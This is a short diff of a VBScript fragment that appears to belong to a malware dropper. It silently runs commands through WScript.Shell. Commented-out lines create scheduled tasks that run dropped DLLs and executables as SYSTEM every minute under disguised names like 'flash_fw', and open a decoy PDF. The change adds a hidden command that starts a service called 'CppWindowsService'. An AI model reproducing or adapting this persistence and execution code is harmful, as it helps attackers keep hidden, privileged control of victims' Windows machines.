@@ -19,7 +19,7 @@ With CreateObject("WScript.Shell")
     '.Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 1 /tr ""rundll32 " & windir & "\sys3.dll sysfunc"" /tn flash_fw /rl highest /F", 0, True
     '.Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 1 /tr """ & windir & "\WindowsTask.exe"" /tn pippo /rl highest /F", 0, True
     '.Run windir & "\file.pdf"
-    
+    .Run "net start CppWindowsService", 0, True
     '.Run "schtasks /create /tn flash_fw /xml " & windir & "\flash_fw.xml /F", 0, True
 End With
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
